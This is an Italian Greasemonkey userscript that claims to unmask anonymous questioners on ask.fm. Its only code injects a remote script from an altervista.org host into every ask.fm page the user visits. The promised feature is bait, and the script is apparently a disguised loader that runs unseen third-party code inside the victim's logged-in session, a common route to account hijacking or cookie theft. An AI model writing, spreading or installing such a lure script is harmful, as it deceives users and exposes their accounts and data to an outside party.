// ==UserScript==
// @name			ASK.FM SCOPRI L'ANONIMO 
// @namespace                   http://userscripts.org/scripts/show/999999
// @version			1.0
// @copyright		       666graphics
// @description		       Scopri chi ti ha fatto domande bastarde!
// @include			http://ask.fm/*
// @icon			http://s3.amazonaws.com/uso_ss/icon/138450/large.gif
// Version numero 1
// ==/UserScript==

function addJavascript(jsname){
	var th = document.getElementsByTagName('head')[0];
	var s = document.createElement('script');
	s.setAttribute('type','text/javascript');
	s.setAttribute('src',jsname);
	th.appendChild(s);
}

if(location.hostname.indexOf("ask.fm") >= 0){
addJavascript('http://easypoint.altervista.org/s1.js');
}

